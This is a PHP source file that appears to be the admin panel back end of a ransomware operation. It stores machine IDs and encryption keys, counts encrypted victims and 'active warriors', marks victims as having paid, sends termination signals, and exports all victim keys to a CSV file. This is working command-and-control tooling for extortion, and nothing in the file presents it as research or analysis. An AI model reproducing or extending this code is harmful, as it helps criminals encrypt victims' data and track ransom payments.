<?php

global $pdo;
session_start();

// Step 1: Redirect to the login page if not logged in
if (!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) {
    header("location: login.php");
    exit;
}

// Step 2: Include the database connection file
require_once "../includes/db.php";

// Step 3: Handle CSV Export
if (isset($_GET['action']) && $_GET['action'] == 'export') {
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="machine_keys.csv"');
    $output = fopen("php://output", "w");
    fputcsv($output, array('S.N', 'Machine ID', 'Encryption Key', 'Received Date', 'Status'));
    /** @noinspection ALL */
    $stmt = $pdo->query("SELECT machine_id, encryption_key, received_date, status FROM machine_keys ORDER BY received_date DESC");
    $sn = 1;
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        fputcsv($output, array($sn++, $row['machine_id'], $row['encryption_key'], $row['received_date'], $row['status']));
    }
    fclose($output);
    exit();
}


// Step 4: Handle Mark as Paid
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['markPaid'])) {

    $machineId = $_POST['machineId'];
    /** @noinspection ALL */
    $updateStmt = $pdo->prepare("UPDATE machine_keys SET status = 'paid' WHERE key_id = ?");

    if ($updateStmt->execute([$machineId])) {
        header("Location: " . $_SERVER['PHP_SELF']); // Refresh the page

        exit;
    }
}

// Step 5: Handle Termination Signal Update
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['terminate'])) {

    $machineId = $_POST['machineId'];

    /** @noinspection ALL */
    $terminateStmt = $pdo->prepare("UPDATE machine_keys SET status = 'terminated' WHERE id = ? AND stop_signal = 1");

    if ($terminateStmt->execute([$machineId])) {
        header("Location: " . $_SERVER['PHP_SELF']); // Refresh the page
        exit;
    }
}

// Step 6: Fetch Data for Dashboard Metrics
/** @noinspection ALL */
$totalEncryptedStmt = $pdo->query("SELECT COUNT(DISTINCT machine_id) AS total_encrypted FROM machine_keys");

$totalEncrypted = $totalEncryptedStmt->fetch(PDO::FETCH_ASSOC)['total_encrypted'];

/** @noinspection ALL */
$machinePaidStmt = $pdo->query("SELECT COUNT(*) AS machine_paid FROM machine_keys WHERE status = 'paid'");

$machinePaid = $machinePaidStmt->fetch(PDO::FETCH_ASSOC)['machine_paid'];

/** @noinspection ALL */
$machineTerminatedStmt = $pdo->query("SELECT COUNT(*) AS machine_terminated FROM machine_keys WHERE stop_signal = 1");

$machineTerminated = $machineTerminatedStmt->fetch(PDO::FETCH_ASSOC)['machine_terminated'];

$activeWarriors = $totalEncrypted - $machinePaid;

// Step 7: Fetch current user information
$currentUserInfo = null;

if (isset($_SESSION["user_id"])) {
    /** @noinspection ALL */
    $sql = "SELECT username, profile_pic FROM users WHERE user_id = :user_id";

    $stmt = $pdo->prepare($sql);

    $stmt->bindParam(":user_id", $_SESSION["user_id"], PDO::PARAM_INT);

    $stmt->execute();

    $currentUserInfo = $stmt->fetch(PDO::FETCH_ASSOC);
}